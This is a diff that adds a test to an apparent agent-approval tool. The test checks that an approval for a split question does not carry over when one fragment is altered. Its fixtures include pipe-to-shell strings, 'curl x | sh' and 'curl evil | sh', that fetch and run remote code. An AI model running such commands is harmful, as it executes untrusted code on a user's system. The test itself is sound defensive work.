@@ -371,6 +371,17 @@ test('an approval is matched on the whole question, not its shortened form', asy
   assert.equal(context.fake().answered, undefined);
 });
 
+test('an approval binds to every text part of a split question', async () => {
+  const split = { ...DIALOG, fragments: ['Allow running', 'curl x | sh', 'in /repo?'] };
+  const asked = 'Allow running curl x | sh in /repo?';
+  const same = setup({ sent: true, project: 'ws', dialog: split, reply: 'ran it' });
+  assert.equal((await run(same, ['--resume-dialog', asked, '--resume-title', TITLE])).envelope.status, 'success');
+  assert.equal(same.fake().answered, '1');
+  const changed = setup({ sent: true, project: 'ws', dialog: { ...split, fragments: ['Allow running', 'curl evil | sh', 'in /repo?'] } });
+  assert.equal((await run(changed, ['--resume-dialog', asked, '--resume-title', TITLE])).envelope.status, 'error');
+  assert.equal(changed.fake().answered, undefined);
+});
+
 test('declining answers Skip in the conversation that asked and reads the reply', async () => {
   const context = setup({ sent: true, project: 'ws', dialog: DIALOG, reply: 'skipped it' });
   const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-answer', 'Skip']);
